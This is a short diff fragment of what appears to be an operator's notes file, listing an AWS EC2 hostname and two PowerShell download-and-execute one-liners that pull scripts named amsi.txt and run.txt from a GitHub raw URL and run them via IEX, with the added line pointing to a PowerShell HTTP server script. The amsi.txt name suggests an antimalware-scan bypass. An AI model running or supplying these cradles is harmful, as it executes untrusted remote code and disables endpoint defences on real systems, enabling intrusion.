@@ -4,3 +4,6 @@ ec2-3-9-48-179.eu-west-2.compute.amazonaws.com
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/amsi.txt')
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
 
+https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1
+
+
